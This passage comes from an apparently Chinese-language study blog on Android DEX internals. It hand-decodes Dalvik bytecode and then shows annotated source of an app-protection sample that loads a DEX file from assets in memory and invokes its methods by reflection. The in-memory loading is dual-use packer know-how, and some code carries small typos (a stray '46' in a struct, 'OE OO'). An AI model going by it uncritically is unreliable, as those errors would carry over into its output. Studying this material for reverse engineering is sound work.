class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs text">public static int readUnsignedLeb128(byte[] src, int offset) &#123;<br>    int result = 0;<br>    int count = 0;<br>    int cur;<br>    do &#123;<br>        cur = copy(src, offset, 1)[0];<br>        cur &amp;= 0xff;<br>        result |= (cur &amp; 0x7f) &lt;&lt; count * 7;<br>        count++;<br>        offset++;<br>        DexParser.POSITION++;<br>    &#125; while ((cur &amp; 0x80) == 128 &amp;&amp; count &lt; 5);<br>    return result;<br>&#125;<br></code></pre></td></tr></table></figure><p>继续回到 DexClassData 中来。<code>header</code> 部分定义了各种字段和方法的个数，后面跟着的分别就是 <strong>静态字段</strong> 、<strong>实例字段</strong> 、<strong>直接方法</strong> 、<strong>虚方法</strong> 的具体数据了。字段用 <code>DexField</code> 表示，方法用 <code>DexMethod</code> 表示。</p><p><strong>DexField</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">struct DexField &#123;<br>    u4 fieldIdx;    /* index to a field_id_item */<br>    u4 accessFlags;<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>fieldIdx : 指向 field_ids ，表示字段信息</li><li>accessFlags ：访问标识符</li></ul><p><strong>DexMethod</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">struct DexMethod &#123;<br>    u4 methodIdx;    /* index to a method_id_item */<br>    u4 accessFlags;<br>    u4 codeOff;      /* file offset to a code_item */<br>46&#125;;<br></code></pre></td></tr></table></figure><p><code>method_idx</code> 是指向 method_ids 的索引，表示方法信息。<code>accessFlags</code> 是该方法的访问标识符。<code>codeOff</code> 是结构体 <code>DexCode</code> 的偏移量。如果你坚持看到了这里，是不是发现说到现在还没说到最重要的东西，DEX 包含的代码，或者说指令，对应的就是 Hello.java 中的 main 方法。没错，<code>DexCode</code> 就是用来存储方法的详细信息以及其中的指令的。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs text">struct DexCode &#123;<br>    u2  registersSize;  // 寄存器个数<br>    u2  insSize;        // 参数的个数<br>    u2  outsSize;       // 调用其他方法时使用的寄存器个数<br>    u2  triesSize;      // try/catch 语句个数<br>    u4  debugInfoOff;   // debug 信息的偏移量<br>    u4  insnsSize;      // 指令集的个数<br>    u2  insns[1];       // 指令集<br>    /* followed by optional u2 padding */  // 2 字节，用于对齐<br>    /* followed by try_item[triesSize] */<br>    /* followed by uleb128 handlersSize */<br>    /* followed by catch_handler_item[handlersSize] */<br>&#125;;<br></code></pre></td></tr></table></figure><p>我们打开 010 Editor，定位到 main() 方法对应的 <code>DexCode</code>，对照进行分析：</p><p><img src="informatin/book/笔记/v2-b515dccfea97aaa4eb5636702c94bafe_1440w.webp" alt="img"></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs text">public class Hello &#123;<br><br>    private static String HELLO_WORLD = &quot;Hello World!&quot;;<br><br>    public static void main(String[] args) &#123;<br>        System.out.println(HELLO_WORLD);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>main()</code> 方法对应的 DexCode 十六进制表示为 ：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">03 00 01 00 02 00 00 00 00 00 79 02 00 00 08 00<br>62 00 01 00 62 01 00 00 6E 20 03 00 01 00 0E 00<br></code></pre></td></tr></table></figure><p>使用的寄存器个数是 3 个。参数个数是 1 个，就是 <code>main()</code> 方法中的 <code>String[] args</code>。调用外部方法时使用的寄存器个数为 2 个。指令个数是 8 。</p><p>终于说到指令了，main() 函数中有 8 条指令，就是上面十六进制中的第二行。尝试来解析一下这段指令。Android 官网就有 Dalvik 指令的相关介绍，<a href="https://link.zhihu.com/?target=https://source.android.google.cn/devices/tech/dalvik/dalvik-bytecode">链接</a>。</p><p>第一个指令 <code>62 00 01 00</code>，查询文档 <code>62</code> 对应指令为 <code>sget-object vAA, field@BBBB</code>，<code>AA</code> 对应 <code>00</code> , 表示 <code>v0</code> 寄存器。<code>BBBB</code> 对应 <code>01 00</code> ，表示 <code>field_ids</code> 中索引为 1 的字段，根据前面的解析结果该字段为 <code>Ljava/lang/System;-&gt;out;Ljava/io/PrintStream</code>，整理一下，<code>62 00 01 00</code> 表示的就是：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">sget-object v0, Ljava/lang/System;-&gt;out:Ljava/io/PrintStream;<br></code></pre></td></tr></table></figure><p>接着是 <code>62 01 00 00</code>。还是 <code>sget-object vAA, field@BBBB</code>, <code>AA</code> 对应 <code>01</code> ，<code>BBBB</code> 对应 <code>0000</code>, 使用的是 <code>v1</code> 寄存器，field 位 field_ids 中索引为 0 的字段，即 <code>LHello;-&gt;HELLO_WORLD;Ljava/lang/String</code>，该句完整指令为：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">sget-object v1, LHello;-&gt;HELLO_WORLD:Ljava/lang/String;<br></code></pre></td></tr></table></figure><p>接着是 <code>6E 20 03 00</code>, 查看文档 <code>6E</code> 指令为 <code>invoke-virtual &#123;vC, vD, vE, vF, vG&#125;, meth@BBBB</code>。<code>6E</code> 后面一个十六位 <code>2</code> 表示调用方法是两个参数，那么 <code>BBBB</code> 就是 <code>03 00</code>，指向 method_ids 中索引为 3 方法。根据前面的解析结果，该方法就是 <code>Ljava/io/PrintStream;-&gt;println(Ljava/lang/String;)V</code>。完整指令为：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">invoke-virtual &#123;v0, v1&#125;, Ljava/io/PrintStream;-&gt;println(Ljava/lang/String;)V<br></code></pre></td></tr></table></figure><p>最后的 <code>0E</code>，查看文档该指令为 <code>return-void</code>，到这 main() 方法就结束了。</p><p>将上面几句指令放在一起:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">62 00 01 00 : sget-object v0, Ljava/lang/System;-&gt;out:Ljava/io/PrintStream;<br>62 01 00 00 : sget-object v1, LHello;-&gt;HELLO_WORLD:Ljava/lang/String;<br>6E 20 03 00 : invoke-virtual &#123;v0, v1&#125;, Ljava/io/PrintStream;-&gt;println(Ljava/lang/String;)V<br>OE OO : return-void<br></code></pre></td></tr></table></figure><p>这就是 main() 方法的完整指令了。还记得我之前的一篇文章 <a href="https://link.zhihu.com/?target=https://juejin.im/post/5c093fd751882535422e4f05">Smali 语法解析——Hello World</a>，其实这个解析结果和 Hello.java 对应的 smali 代码是一致的：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs text">.method public static main([Ljava/lang/String;)V<br>    .registers 3<br><br>    .prologue<br>    .line 6<br>    sget-object v0, Ljava/lang/System;-&gt;out:Ljava/io/PrintStream;<br><br>    sget-object v1, LHello;-&gt;HELLO_WORLD:Ljava/lang/String;<br><br>    invoke-virtual &#123;v0, v1&#125;, Ljava/io/PrintStream;-&gt;println(Ljava/lang/String;)V<br><br>    .line 7<br>    return-void<br>.end method<br></code></pre></td></tr></table></figure><p>ApkProtect</p><p>RawDexClassLoader&#x2F;src&#x2F;com&#x2F;payegis&#x2F;DemoActivity.java</p><p>提供Android的内部类com.android.TestClassLoader来加载test.dex，做的基本是文件打开读入字节等工作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.payegis;<br><br><span class="hljs-comment">// 导入所需的类和接口</span><br><span class="hljs-keyword">import</span> android.app.Activity;<br><span class="hljs-keyword">import</span> android.content.res.AssetManager;<br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.widget.Toast;<br><br><span class="hljs-comment">// 导入资源文件 - 这可能是一个生成的类，包含R资源的引用，com.payegis.rawdexclassloader.java调用</span><br><span class="hljs-keyword">import</span> com.payegis.rawdexclassloader.R;<br><br><span class="hljs-comment">// 导入Java I/O和反射相关的类</span><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-comment">// DemoActivity类继承自Activity，是Android中的一个基本UI组件</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemoActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Activity</span> &#123;<br><br>    <span class="hljs-comment">// onCreate是Activity生命周期中的一部分，在Activity创建时调用</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> &#123;<br>        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState); <span class="hljs-comment">// 调用超类（Activity）的onCreate方法</span><br>        setContentView(R.layout.activity_main); <span class="hljs-comment">// 设置Activity使用的布局</span><br>        runTest(); <span class="hljs-comment">// 调用runTest方法，它包含自定义的测试代码</span><br>    &#125;<br>    <br>    <span class="hljs-comment">// runTest方法，用于尝试加载并执行DEX文件中的代码</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">runTest</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">// 创建自定义的RawDexClassLoader实例，将DEX文件加载到应用程序中</span><br>        <span class="hljs-type">RawDexClassLoader</span> <span class="hljs-variable">cl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RawDexClassLoader</span>(<br>                getFromAssets(<span class="hljs-string">&quot;test.dex&quot;</span>), <span class="hljs-comment">// 从Assets文件夹获取DEX文件的内容</span><br>                <span class="hljs-string">&quot;test.dex&quot;</span>, <span class="hljs-comment">// DEX文件的名称</span><br>                getApplicationInfo().dataDir + <span class="hljs-string">&quot;/lib&quot;</span>, <span class="hljs-comment">// 应用程序数据目录的路径</span><br>                getApplicationContext().getClassLoader()); <span class="hljs-comment">// 获取应用程序的类加载器</span><br><br>        Class&lt;?&gt; clazz = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 使用自定义类加载器尝试加载DEX文件中的类</span><br>            clazz = cl.loadClass(<span class="hljs-string">&quot;com.android.TestClassLoader&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            e.printStackTrace(); <span class="hljs-comment">// 打印异常堆栈跟踪</span><br>            Toast.makeText(<span class="hljs-built_in">this</span>, <span class="hljs-string">&quot;Load Class Failed!&quot;</span>, Toast.LENGTH_LONG).show(); <span class="hljs-comment">// 显示加载类失败的Toast消息</span><br>            <span class="hljs-keyword">return</span>; <span class="hljs-comment">// 类未找到，提前返回</span><br>        &#125;<br><br>        <span class="hljs-comment">// 如果上面的代码没有抛出异常，表示类已成功加载</span><br>        <span class="hljs-comment">// 显示类的字符串表示</span><br>        Toast.makeText(<span class="hljs-built_in">this</span>, clazz.toString(), Toast.LENGTH_LONG).show();    <br>        <br>        <span class="hljs-type">Method</span> <span class="hljs-variable">mth</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>; <span class="hljs-comment">// 声明Method类型的变量</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 通过反射获取类中名为setValue的方法</span><br>            mth = clazz.getMethod(<span class="hljs-string">&quot;setValue&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;<span class="hljs-type">int</span>.class&#125;);<br>            mth.invoke(<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-number">5</span>&#125;); <span class="hljs-comment">// 调用setValue方法，参数为5</span><br>            <br>            <span class="hljs-comment">// 通过反射获取类中名为getValue的方法</span><br>            mth = clazz.getDeclaredMethod(<span class="hljs-string">&quot;getValue&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;);<br>            <span class="hljs-type">int</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>) mth.invoke(<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;); <span class="hljs-comment">// 调用getValue方法，获取结果</span><br>            <span class="hljs-comment">// 显示getValue方法的结果</span><br>            Toast.makeText(<span class="hljs-built_in">this</span>, <span class="hljs-string">&quot;getValue: &quot;</span> + String.valueOf(result), Toast.LENGTH_LONG).show();   <br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException e) &#123;<br>            e.printStackTrace(); <span class="hljs-comment">// 打印异常堆栈跟踪</span><br>        &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>            e.printStackTrace(); <span class="hljs-comment">// 打印异常堆栈跟踪</span><br>        &#125; <span class="hljs-keyword">catch</span> (IllegalArgumentException e) &#123;<br>            e.printStackTrace(); <span class="hljs-comment">// 打印异常堆栈跟踪</span><br>        &#125; <span class="hljs-keyword">catch</span> (InvocationTargetException e) &#123;<br>            e.printStackTrace(); <span class="hljs-comment">// 打印异常堆栈跟踪</span><br>        &#125;<br><br>    &#125;<br><br>    <span class="hljs-comment">// getFromAssets方法，用于从Assets文件夹读取指定文件的内容</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] getFromAssets(String filename) &#123;<br>        <span class="hljs-type">byte</span>[] buffer = <span class="hljs-literal">null</span>; <span class="hljs-comment">// 声明一个用于存储文件内容的字节数组</span><br>        <span class="hljs-type">AssetManager</span> <span class="hljs-variable">am</span> <span class="hljs-operator">=</span> getAssets(); <span class="hljs-comment">// 获取AssetManager实例，用于访问Assets文件夹</span><br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>; <span class="hljs-comment">// 声明一个输入流</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            in = am.open(filename); <span class="hljs-comment">// 打开指定的文件</span><br>            <span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> in.available(); <span class="hljs-comment">// 获取文件的可读字节数</span><br>            buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[len]; <span class="hljs-comment">// 根据文件大小，初始化字节数组</span><br>            <span class="hljs-keyword">if</span> (in.read(buffer) != len) &#123; <span class="hljs-comment">// 读取文件内容</span><br>                <span class="hljs-comment">// 如果没有一次性读取完毕，抛出异常</span><br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IOException</span>(<span class="hljs-string">&quot;Could not completely read file &quot;</span> + filename);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace(); <span class="hljs-comment">// 打印异常堆栈跟踪</span><br>            <span class="hljs-comment">// 在这里可以处理异常，或者返回null，或者再次抛出异常</span><br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-keyword">if</span> (in != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    in.close(); <span class="hljs-comment">// 关闭输入流以释放系统资源</span><br>                &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                    e.printStackTrace(); <span class="hljs-comment">// 如果无法关闭输入流，打印异常堆栈跟踪</span><br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> buffer; <span class="hljs-comment">// 返回读取的文件内容</span><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>RawDexClassLoader&#x2F;src&#x2F;com&#x2F;payegis&#x2F;<strong>RawDexClassLoader.java</strong></p><p>RawDexClassLoader的自定义类加载器，用于Android应用中加载DEX文件（Dalvik Executable文件，即Android平台的可执行文件）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.payegis; <span class="hljs-comment">//包所在</span><br><br><span class="hljs-keyword">import</span> java.io.File; <span class="hljs-comment">//java.io.File类，用于对文件和文件系统路径进行操作。</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RawDexClassLoader</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ClassLoader</span> &#123; <span class="hljs-comment">//继承classloader类，加载类和资源</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ClassLoader definingContext; <span class="hljs-comment">//保存了用于加载类的父类加载器</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> RawDexFile mDex; <span class="hljs-comment">//加载的DEX文件</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String mRawLibPath;  <span class="hljs-comment">//本地路径</span><br>    <span class="hljs-keyword">private</span> String[] mLibPaths; <span class="hljs-comment">//分隔后的本地库路径数组</span><br><br>    <span class="hljs-comment">//构造器接受DEX文件的字节数组、DEX文件名、库文件路径以及父类加载器作为参数。</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">RawDexClassLoader</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] rawDex, String dexName, String libraryPath, ClassLoader parent)</span> &#123;<br>        <span class="hljs-built_in">super</span>(parent);<br>        mDex = loadRawDex(rawDex, dexName);  <span class="hljs-comment">//调用loadRawDex方法，加载DEX文件到内存中。</span><br>        mRawLibPath = libraryPath;<br>        definingContext = parent;<br>        setNativeLibrary(libraryPath); <span class="hljs-comment">//调用setNativeLibrary方法，设置本地库路径。</span><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> Class&lt;?&gt; findClass(String className) <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>        <span class="hljs-comment">// TODO Auto-generated method stub</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">if</span> (mDex != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">slashName</span> <span class="hljs-operator">=</span> className.replace(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>); <span class="hljs-comment">//将类名中的点替换为斜线（这是类文件内部使用的格式），然后调用Dex文件的loadClass方法来加载类。</span><br>            clazz = mDex.loadClass(slashName, <span class="hljs-built_in">this</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> clazz;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">findLibrary</span><span class="hljs-params">(String libraryName)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">fileName</span> <span class="hljs-operator">=</span> System.mapLibraryName(libraryName);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; mLibPaths.length; i++) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">pathName</span> <span class="hljs-operator">=</span> mLibPaths[i] + fileName;<br>            <span class="hljs-type">File</span> <span class="hljs-variable">test</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(pathName);<br><br>            <span class="hljs-keyword">if</span> (test.exists()) &#123;<br>                <span class="hljs-keyword">return</span> pathName;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> String[] getLoadedClasses() &#123;<br>        <span class="hljs-keyword">return</span> mDex.getLoadedClassName();  <span class="hljs-comment">//定义getLoadedClasses方法，返回DEX文件中已加载类的名称数组。</span><br>    &#125;<br>    <br>    <span class="hljs-meta">@SuppressWarnings(&quot;unused&quot;)</span>   <span class="hljs-comment">//定义loadRawDex方法，用于加载原始DEX文件。@SuppressWarnings(&quot;unused&quot;)注解表示即使这个私有方法当前未被使用，也不要显示警告。</span><br>    <span class="hljs-keyword">private</span> RawDexFile <span class="hljs-title function_">loadRawDex</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] rawDex, String dexName)</span> &#123;  <span class="hljs-comment">//调用RawDexFile.loadDex方法加载DEX文件，并返回一个RawDexFile对象。//调用RawDexFile.Java</span><br>        <span class="hljs-keyword">return</span> RawDexFile.loadDex(rawDex, dexName, <span class="hljs-number">0</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setNativeLibrary</span><span class="hljs-params">(String libraryPath)</span> &#123;<br>        <span class="hljs-comment">//获取系统属性path.separator和file.separator，为路径分隔符和文件分隔符。</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">pathList</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;java.library.path&quot;</span>, <span class="hljs-string">&quot;.&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">pathSep</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;path.separator&quot;</span>, <span class="hljs-string">&quot;:&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">fileSep</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;file.separator&quot;</span>, <span class="hljs-string">&quot;/&quot;</span>);<br>        <br>        <span class="hljs-keyword">if</span> (mRawLibPath != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">if</span> (pathList.length() &gt; <span class="hljs-number">0</span>) &#123;<br>                pathList += pathSep + mRawLibPath;<br>            &#125;<br>            <span class="hljs-keyword">else</span> &#123;<br>                pathList = mRawLibPath;<br>            &#125;<br>        &#125;<br><br>        mLibPaths = pathList.split(pathSep);<br><br>        <span class="hljs-comment">// Add a &#x27;/&#x27; to the end so we don&#x27;t have to do the property lookup</span><br>        <span class="hljs-comment">// and concatenation later.</span><br>        <span class="hljs-comment">//用路径分隔符分割路径列表字符串，生成路径数组。</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; mLibPaths.length; i++) &#123;<br>            <span class="hljs-keyword">if</span> (!mLibPaths[i].endsWith(fileSep)) &#123;<br>                mLibPaths[i] += fileSep;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <br>&#125;<br><br></code></pre></td></tr></table></figure><p>RawDexClassLoader&#x2F;src&#x2F;com&#x2F;payegis&#x2F;<strong>RawDexFile.java</strong></p><p>JNI（Java Native Interface）与本地代码交互以处理DEX文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">package</span> com.payegis;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> 